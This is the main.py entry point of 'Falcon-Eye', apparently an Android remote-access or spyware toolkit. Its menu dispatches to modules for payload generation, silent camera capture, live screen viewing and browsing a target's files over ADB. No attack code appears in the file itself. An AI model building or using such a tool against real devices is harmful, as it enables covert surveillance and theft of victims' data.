# main.py
from utils.banner import show_banner
from modules import ip_tracker
from modules import adb_manager
from modules import payload_generator
from modules import camera_capture
from modules import screen_stream
from modules import file_operations
from modules import session_mode
from modules import file_explorer

def main():
    show_banner()
    print("\n[1] Device Tracker (IP/Network)")
    print("[2] ADB Manager")
    print("[3] Generate Payload")
    print("[4] Silent Camera Capture")
    print("[5] Live Screen Viewer")
    print("[6] File Operations")
    print("[7] Session Mode Setup (ADB WiFi / QR / Manual IP)")
    print("[8] File Explorer (Target)")
    print("[9] Exit")

    choice = input("\nEnter your choice: ")

    if choice == '1':
        ip_tracker.track_devices()

    elif choice == '2':
        adb_manager.adb_menu()

    elif choice == '3':
        payload_generator.generate_payload()

    elif choice == '4':
        camera_capture.capture_image()

    elif choice == '5':
        screen_stream.start_stream()

    elif choice == '6':
        file_operations.manage_files()

    elif choice == '7':
        session_mode.select_mode()

    elif choice == '8':
        file_explorer.browse_target()

    elif choice == '9':
        print("Exiting Falcon-Eye. Goodbye!")
        exit()

    else:
        print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
